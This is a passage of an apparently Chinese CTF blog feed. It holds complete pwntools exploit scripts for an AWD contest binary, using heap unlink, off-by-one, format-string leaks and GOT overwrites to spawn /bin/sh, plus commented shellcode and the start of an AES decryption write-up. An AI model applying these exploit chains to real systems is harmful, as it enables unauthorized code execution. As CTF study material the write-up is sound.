class="string">"a"</span>)</div><div class="line"><span class="comment"># heap overlay </span></div><div class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x1c0</span><span class="number">-0x30</span>+<span class="number">1</span>)</div><div class="line">payload = payload.ljust(<span class="number">0x54</span>,<span class="string">"a"</span>)</div><div class="line"><span class="comment"># fake chunck off by one</span></div><div class="line">payload += chr(<span class="number">0x30</span>+<span class="number">0x10</span>)</div><div class="line">sd(payload)</div><div class="line"><span class="comment"># pass</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_war</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_vassal</span><span class="params">(addr)</span>:</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(<span class="number">0x50</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(p64(addr))</div><div class="line">create_house(<span class="number">0x50</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x401AE2\nc")</span></div><div class="line">create_house(<span class="number">0x40</span>)</div><div class="line">change_weapon(<span class="number">0</span>,<span class="number">4</span>)</div><div class="line">change_weapon(<span class="number">1</span>,<span class="number">5</span>)</div><div class="line">start_war()</div><div class="line"><span class="comment"># race condition</span></div><div class="line">change_word()</div><div class="line"><span class="keyword">import</span> time</div><div class="line">time.sleep(<span class="number">3</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x402301\nc")</span></div><div class="line"><span class="comment"># unsorted bin FIFO</span></div><div class="line">create_house2()</div><div class="line"><span class="comment"># fmt</span></div><div class="line">change_vassal(elf.symbols[<span class="string">"printf"</span>])</div><div class="line"></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># edit_addr</span></div><div class="line">sl(<span class="string">"%7$n...."</span>+p64(<span class="number">0x605130</span>))</div><div class="line"><span class="comment"># change_vassal(system_addr)</span></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x402301\nc")</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"123"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sd(<span class="string">"\n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x7</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line">sl(p64(system_addr))</div><div class="line"></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><h3 id="第二个漏洞"><a href="#第二个漏洞" class="headerlink" title="第二个漏洞"></a>第二个漏洞</h3><p>第二个漏洞出现在east模块，该模块下，存储slaves的长度被设计成为 chunk_size-8，而chunks_size由于其末三位是标记位，prev_size标记位于第8位，该标记位在前一个chunk在使用中时置1，故而当我们过呢关系slaves时，我们拥有一个字节的溢出，即off by one。我们可以利用这一个字节的溢出来修改下一个chunk的prev_size和其标记位来为实现overlay heap 和 unlink 攻击做铺垫（事实上这边只用到了unlink攻击，向前unlink），这边其实卡了我很久，一开始在想向前合并还是向后合并，后来尝试向后合并，但是 loyalty chunk的大小是0xe0+0x10 向后合并需要在下一个chunk构建fake_chunk_head，故而需要伪造 loyalty chunk_size 的字段值，使其满足寻址（找到下一个chunk）的逻辑，这个值是<code>0xe0+0x10+0x1+0x10=0x101</code>，很遗憾，需要溢出两个字节才能达到要求，而我们并没有溢出两个字节的条件。故而想到向前合并，在loyalty chunk的前一个chunk中构建fake_chunk_head，将loyalty chunk_size_prev_flag置0，构造loyalty prev_size，触发free loyalty chunk，我们便可以获得一次任意地址写的机会~~利用代码如下，其实直接看代码就可以，逻辑很清晰。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-08-17 00:53:09</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="comment">#socat TCP4-LISTEN:10001,fork EXEC:./pwn1</span></div><div class="line">target = <span class="string">"./pwn"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># east</span></div><div class="line">ru(<span class="string">"exit\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Occupy</span><span class="params">(slaves,date)</span>:</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"choice:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(slaves))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(date)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_slaves</span><span class="params">(_id,date)</span>:</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sl(str(_id))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(str(date))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ruin</span><span class="params">(_id,flag)</span>:</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"ruin\n"</span>)</div><div class="line">sl(str(_id))</div><div class="line">ru(<span class="string">"nate him?(y/n)"</span>)</div><div class="line">sl(flag)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(_id)</span>:</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sl(str(_id))</div><div class="line"></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#0</span></div><div class="line">ru(<span class="string">"Khal"</span>)</div><div class="line">sl(<span class="string">"123"</span>)</div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#1</span></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#2</span></div><div class="line"><span class="comment"># get fastbin#2 addr</span></div><div class="line">ruin(<span class="number">2</span>,<span class="string">"n"</span>)</div><div class="line">ruin(<span class="number">1</span>,<span class="string">"n"</span>)</div><div class="line">show(<span class="number">1</span>)</div><div class="line">ru(<span class="string">"salves: "</span>)</div><div class="line">fast_bin_addr  = u64(ru(<span class="string">"\n="</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"fast_bin_addr#0="</span>+hex(fast_bin_addr)</div><div class="line"></div><div class="line"><span class="comment"># heap_base addr</span></div><div class="line"></div><div class="line">heap_addr = fast_bin_addr-(fast_bin_addr &amp; <span class="number">0xfff</span>)</div><div class="line">fast_bin_addr_ptr = heap_addr+<span class="number">0x10</span>+<span class="number">0x20</span></div><div class="line"></div><div class="line"><span class="comment"># rebuild </span></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#1</span></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#2</span></div><div class="line"></div><div class="line"><span class="comment"># overwrite small chunk size  unlink prev_fast_chunk</span></div><div class="line"></div><div class="line">fake_chunk_head = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(fast_bin_addr_ptr<span class="number">-0x18</span>)+p64(fast_bin_addr_ptr<span class="number">-0x10</span>)</div><div class="line">payload = fake_chunk_head</div><div class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">"\x00"</span>)</div><div class="line">update_slaves(<span class="number">0</span>,payload+p64(<span class="number">0x40</span>)+chr(<span class="number">0xe0</span>+<span class="number">0x10</span>))</div><div class="line"><span class="comment"># unlink</span></div><div class="line">ruin(<span class="number">1</span>,<span class="string">"y"</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x40131D\nc")</span></div><div class="line"><span class="comment"># change atoi to printf</span></div><div class="line">update_slaves(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x18</span>+p64(elf.got[<span class="string">"atoi"</span>]))</div><div class="line">update_slaves(<span class="number">0</span>,p64(elf.symbols[<span class="string">"printf"</span>]))</div><div class="line"></div><div class="line"><span class="comment"># leak libc and calc system_addr</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sd(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x2</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sd(<span class="string">"\n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(p64(system_addr))</div><div class="line"><span class="comment"># exec /bin/sh</span></div><div class="line">sd(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><h3 id="第三个漏洞"><a href="#第三个漏洞" class="headerlink" title="第三个漏洞"></a>第三个漏洞</h3><p>第三个漏洞非常简单，字符串数组空间大小为0x20，然而却给它赋于了0x28的大小用户输入，导致其溢出覆盖了下一个指针，从而引发任意地址写的利用，我们可以利用任意地址写，将atoi改成printf来泄漏system地址，然后将atoi改成system实现任意代码执行,exp如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-08-17 09:43:44</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="comment">#socat TCP4-LISTEN:10001,fork EXEC:./pwn1</span></div><div class="line">target = <span class="string">"./pwn"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"><span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line">ru(<span class="string">"exit\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line"></div><div class="line"><span class="comment"># change atoi to printf</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"y"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line">payload = p64(elf.symbols[<span class="string">"printf"</span>])+<span class="string">"\n"</span></div><div class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">"\x00"</span>)</div><div class="line">payload +=p64(elf.got[<span class="string">"atoi"</span>])</div><div class="line">sd(payload)</div><div class="line"></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line"></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">5</span>)</div><div class="line">ru(<span class="string">"y/n)\n"</span>)</div><div class="line">sl(<span class="string">"y"</span>)</div><div class="line">ru(<span class="string">"nd up with '\\n')\n"</span>)</div><div class="line"></div><div class="line">payload = p64(system_addr)+<span class="string">"\n"</span></div><div class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">"\x00"</span>)</div><div class="line">payload +=p64(elf.got[<span class="string">"atoi"</span>])</div><div class="line">sd(payload)</div><div class="line"></div><div class="line"><span class="comment"># \n</span></div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;将atoi_got修改成printf_plt，威力无穷~&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;线下赛只有一个pwn题，但这一个pwn题却出的非常好，虽然防御机制没有全开，但是考察点非常之多，就其中一个漏洞的利用，就考察了如下五个知识点。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;string overflow&lt;/li&gt;
&lt;li&gt;int overflow&lt;/li&gt;
&lt;li&gt;off by one&lt;/li&gt;
&lt;li&gt;race condition&lt;/li&gt;
&lt;li&gt;heap overlay &lt;/li&gt;
&lt;li&gt;fmt&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="awd" scheme="https://winter3un.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>8月9日个人赛总结 &amp;&amp; writeup</title>
    <link href="https://winter3un.github.io/2017/08/10/2017-8-9/"/>
    <id>https://winter3un.github.io/2017/08/10/2017-8-9/</id>
    <published>2017-08-10T09:20:04.000Z</published>
    <updated>2018-06-15T08:42:10.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>还好这次比赛网络环境比较差，主办方被迫放了许多离线题，让我这只bin dog有机可乘（手动滑稽），但这次比赛也确实发现自身的web能力有限，对于一些简单的web题竟然出现无从下手的情况。。也借这次比赛总结下离线环境下一些特殊操作吧。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>对于一些密码类的题目，手头有合适的工具最好了，但很多情况下，工具并不适用，比如这次比赛中，出现的aes解密，不清楚加密模式，需要输入iv和key，而手头的工具只可以输入key，且加密模式确定，没办法，只能去找库，不过比较幸运的是，之前安装过一个crypt的python库，看里面的源码，竟然有aes加密的说明，简单的倒推一下就能够推出解密脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line">key = <span class="string">b'EaRncVfLgIPMaygA'</span></div><div class="line">iv = <span class="string">b'HDkMsMEzkkzyQLTH'</span></div><div class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</div><div class="line">msg = iv + base64.b64decode(<span 